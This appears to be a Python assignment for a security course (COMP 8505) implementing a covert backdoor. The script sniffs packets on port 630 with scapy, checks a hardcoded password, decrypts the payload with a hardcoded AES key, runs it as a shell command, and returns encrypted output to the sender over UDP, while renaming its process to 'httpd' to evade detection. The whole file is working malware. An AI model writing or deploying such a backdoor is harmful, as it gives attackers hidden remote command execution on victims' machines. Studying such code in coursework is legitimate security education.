#!/usr/bin/env python3
###############################################################################
# Adam Harrison                                                               #
# COMP 8505 a2                                                                #                                                                            #
###############################################################################
import getopt, sys, time, os, ctypes, platform, subprocess, setproctitle
import scapy.all as scapy
from Crypto.Cipher import AES
dst_p = 630
DENCRYPTION_KEY='ABC123DEF456GHI7'
PASSWORD = 'q3ty'
BLOCK_SIZE = 16
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
def main():
    while True:
        recv_command()

def recv_command():
    filters = 'dst port %s' % (dst_p)
    scapy.sniff(filter=filters, prn=sniff_callback, store=0)

def sniff_callback(packet):
    if packet.haslayer(scapy.Raw):
        load = packet['Raw'].load
        password = load[0:len(PASSWORD)].decode('utf-8')

        if password != PASSWORD:
            return

        encrypted_command = load[len(PASSWORD):len(load)]
        cipher = AES.new(DENCRYPTION_KEY, AES.MODE_ECB)
        command = unpad(cipher.decrypt(encrypted_command))

        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = output.stdout.read() + output.stderr.read()
        encrypted_output = cipher.encrypt(pad(output.decode('utf-8')))
        send_output(encrypted_output, packet)

def send_output(output, packet):
    dst = packet[scapy.IP].src
    src_p = packet[scapy.UDP].sport
    scapy.send(scapy.IP(dst=dst)/scapy.UDP(sport=dst_p, dport=src_p)/scapy.Raw(load=output))
    scapy.send(scapy.IP(dst=dst)/scapy.UDP(sport=dst_p, dport=src_p)/scapy.Raw(load='finished'.encode('utf-8')))

def mask():
    set_proc_name("httpd")

def set_proc_name(name):
    libc = ctypes.cdll.LoadLibrary("libc.{}".format("so.6" if platform.uname()[0] != "Darwin" else "dylib"))
    buff = ctypes.create_string_buffer(len(name) + 1)
    buff.value = bytes(name, 'utf-8')
    test = ctypes.byref(buff)
    #libc.prctl(15, test, 0, 0, 0)
    setproctitle.setproctitle(name)

if __name__ == "__main__":
    try:
        mask()
        main()
    except KeyboardInterrupt:
        print('Bye...')
